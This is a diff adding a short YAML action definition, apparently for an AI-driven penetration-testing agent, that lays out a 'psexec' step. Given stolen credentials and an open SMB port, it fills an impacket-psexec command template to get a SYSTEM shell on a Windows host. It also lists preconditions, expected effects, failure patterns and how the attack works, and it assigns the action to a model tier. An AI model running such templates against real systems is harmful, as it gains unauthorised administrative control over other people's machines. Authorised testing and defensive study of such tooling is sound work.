@@ -1,0 +1,21 @@
+name: psexec
+category: shell
+description: Get SYSTEM shell via SMB admin share write + service creation
+preconditions:
+  - service.port==445
+  - has_cred
+  - has_password
+parameters:
+  target_ip: from_service.host_ip
+  username: from_cred.username
+  password: from_cred.password
+  domain: from_cred.domain
+command_template: "impacket-psexec {domain}/{username}:'{password}'@{target_ip} 2>&1"
+expected_effects:
+  - shell_obtained
+  - privilege=system
+falsifier:
+  pattern: "STATUS_ACCESS_DENIED|STATUS_LOGON_FAILURE|Connection refused|STATUS_SHARING_VIOLATION"
+  timeout: 30
+model_tier: haiku
+mechanism: "Writes an executable to ADMIN$ or C$ share, creates a Windows service pointing to it, starts the service (runs as SYSTEM), opens a named pipe for I/O. Requires local admin creds and writable admin share."
